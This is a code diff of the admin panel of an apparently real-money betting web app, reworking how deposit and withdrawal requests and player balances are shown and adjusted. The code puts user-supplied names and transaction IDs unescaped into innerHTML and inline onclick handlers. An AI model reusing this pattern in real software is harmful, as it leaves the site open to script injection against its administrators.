               <div class="p-3 bg-black/40 border-b border-amber-500/20 flex justify-between items-center shrink-0">
                 <span class="text-xs text-amber-200/70 font-semibold">Question \${qIdx + 1} of \${cb.activeQuestions.length}</span>
@@ -1872,42 +1937,32 @@ app.get('/', (req, res) => {
                 <div class="space-y-2">
                   <h3 class="font-bold text-xs text-amber-300/80">DEPOSIT & WITHDRAWAL REQUESTS</h3>
                   \${state.adminTxns.map(t => \`
-                    <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 text-xs space-y-2">
-                      <div class="flex justify-between font-bold">
-                        <span class="text-amber-300 uppercase">\${t.type} - ₹\${t.amount}</span>
-                        <span class="\${t.status==='approved'?'text-green-400':t.status==='rejected'?'text-red-400':'text-amber-400'} font-bold uppercase">\${t.status}</span>
+                    <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 flex justify-between items-center text-xs">
+                      <div>
+                        <div class="font-bold text-amber-300">\${t.username} (\${t.type.toUpperCase()})</div>
+                        <div class="text-amber-100/70">₹\${t.amount} | \${t.txnId || t.upiId}</div>
                       </div>
-                      <div class="text-[11px] text-gray-300">User: <span class="text-white font-bold">\${t.username}</span></div>
-                      \${t.type === 'deposit' ? \`<div class="text-[10px] font-mono text-gray-400">Txn/UTR ID: \${t.txnId}</div>\` : \`<div class="text-[10px] font-mono text-gray-400">UPI ID: \${t.upiId}</div>\`}
                       \${t.status === 'pending' ? \`
-                        <div class="flex gap-2 pt-1">
-                          <button onclick="processTxn('\${t._id}', 'approve')" class="w-1/2 py-1.5 bg-emerald-600 rounded-lg text-white font-bold">Approve</button>
-                          <button onclick="processTxn('\${t._id}', 'reject')" class="w-1/2 py-1.5 bg-red-600 rounded-lg text-white font-bold">Reject</button>
+                        <div class="flex gap-1">
+                          <button onclick="processTxn('\${t._id}', 'approve')" class="px-2 py-1 bg-emerald-700 text-white font-bold rounded-lg text-[10px]">Approve</button>
+                          <button onclick="processTxn('\${t._id}', 'reject')" class="px-2 py-1 bg-red-700 text-white font-bold rounded-lg text-[10px]">Reject</button>
                         </div>
-                      \` : ''}
+                      \` : \`<span class="font-bold uppercase text-[10px] \${t.status==='approved'?'text-green-400':'text-red-400'}">\${t.status}</span>\`}
                     </div>
                   \`).join('')}
                 </div>
               \` : \`
-                <div class="tomato-card p-4 rounded-2xl space-y-3">
-                  <h3 class="font-bold text-sm text-amber-300">Modify User Balance</h3>
-                  <input id="bu" placeholder="Player Username" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm outline-none text-white">
-                  <input id="ba" type="number" placeholder="Amount (+1000 or -500)" class="w-full p-3 bg-black/60 border border-amber-500/40 rounded-xl text-sm outline-none text-white">
-                  <button onclick="modifyBalance()" class="w-full bg-emerald-600 text-white font-black py-3 rounded-xl text-sm">Update Balance</button>
-                </div>
-
                 <div class="space-y-2">
-                  <h3 class="font-bold text-xs text-amber-300/80">ALL REGISTERED PLAYERS STATISTICS</h3>
+                  <h3 class="font-bold text-xs text-amber-300/80">PLAYER MANAGEMENT</h3>
                   \${state.adminUsers.map(u => \`
-                    <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 text-xs space-y-1">
-                      <div class="flex justify-between font-bold text-amber-300">
-                        <span>👤 \${u.username}</span>
-                        <span class="text-green-400 font-mono">₹\${u.balance.toFixed(2)}</span>
+                    <div class="bg-black/60 p-3 rounded-xl border border-amber-500/30 flex justify-between items-center text-xs">
+                      <div>
+                        <div class="font-bold text-amber-300">\${u.username}</div>
+                        <div class="text-green-400 font-mono">₹\${u.balance.toFixed(2)}</div>
                       </div>
-                      <div class="grid grid-cols-3 gap-1 text-[10px] text-gray-400 font-mono mt-1">
-                        <div>Won: <span class="text-green-400">₹\${u.totalWon}</span></div>
-                        <div>Lost: <span class="text-red-400">₹\${u.totalLost}</span></div>
-                        <div>Placed: <span class="text-amber-200">₹\${u.totalBetPlaced}</span></div>
+                      <div class="flex gap-1">
+                        <button onclick="updateBalance('\${u.username}', 100)" class="px-2 py-1 bg-emerald-900 border border-emerald-500 text-emerald-300 font-bold rounded-lg text-[10px]">+100</button>
+                        <button onclick="updateBalance('\${u.username}', -100)" class="px-2 py-1 bg-red-900 border border-red-500 text-red-300 font-bold rounded-lg text-[10px]">-100</button>
                       </div>
                     </div>
                   \`).join('')}
@@ -1920,33 +1975,37 @@ app.get('/', (req, res) => {
 
       app.innerHTML = html + popupHtml + customBetModalHtml;
 
-      if(state.currentView === 'aviator') renderAviatorOverlay();
-      if(state.currentView === 'prediction') renderPredictionGraph();
-      if(state.currentView === 'careerboot' && state.careerboot.stage === 'WHEEL') renderCareerBootWheelCanvas();
+      if (state.currentView === 'aviator') renderAviatorOverlay();
+      if (state.currentView === 'prediction') renderPredictionGraph();
+      if (state.currentView === 'careerboot' && state.careerboot.stage === 'WHEEL') renderCareerBootWheelCanvas();
     }
 
     async function createPlayer() {
-      const username = document.getElementById('nu').value;
-      const password = document.getElementById('np').value;
+      const u = document.getElementById('nu').value;
+      const p = document.getElementById('np').value;
       const res = await fetch('/api/admin/create-user', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
+        body: JSON.stringify({ username: u, password: p })
       });
-      if (res.ok) { fetchAdminData(); showPopup('User Created Successfully', 'OK'); }
-      else showPopup('Error Creating User', 'try again');
+      if (res.ok) {
+        fetchAdminData();
+        showPopup('User Created Successfully!', 'OK');
+      } else {
+        showPopup('User Creation Failed', 'OK');
+      }
     }
 
-    async function modifyBalance() {
-      const username = document.getElementById('bu').value;
-      const amount = parseFloat(document.getElementById('ba').value);
+    async function updateBalance(username, amount) {
       const res = await fetch('/api/admin/update-balance', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username, amount })
       });
-      if (res.ok) { fetchAdminData(); showPopup('Balance Updated!', 'OK'); }
-      else showPopup('User Not Found', 'OK');
+      if (res.ok) {
+        fetchAdminData();
+      }
     }
 
+    // MONGOOSE CONNECT & START SERVER
     render();
   </script>
 </body>
